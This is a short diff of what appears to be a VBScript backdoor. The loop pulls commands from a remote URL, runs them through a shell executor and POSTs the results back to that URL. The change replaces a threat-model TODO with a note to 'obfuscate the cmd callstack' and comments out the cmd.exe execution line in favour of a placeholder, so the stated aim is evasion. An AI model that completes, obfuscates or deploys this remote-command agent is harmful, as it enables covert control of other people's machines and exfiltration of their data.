@@ -1,4 +1,4 @@
-' TODO: build threat model for this payload.
+' TODO: obfuscate the cmd callstack
 
 Dim sourceURL, updateInterval, httpClient, shellExecutor, commandResponse, base64Command
 
@@ -20,7 +20,7 @@ Do While True
         
         If InStr(base64Command, "exit") > 0 Then Exit Do
         
-        Set commandResponse = shellExecutor.Exec("cmd.exe /c " & base64Command)
+'       Set commandResponse = shellExecutor.Exec("[InsertShellBinary] /c " & base64Command)
         
         httpClient.open "POST", sourceURL, False
         httpClient.setRequestHeader "Content-Type", "text/plain"
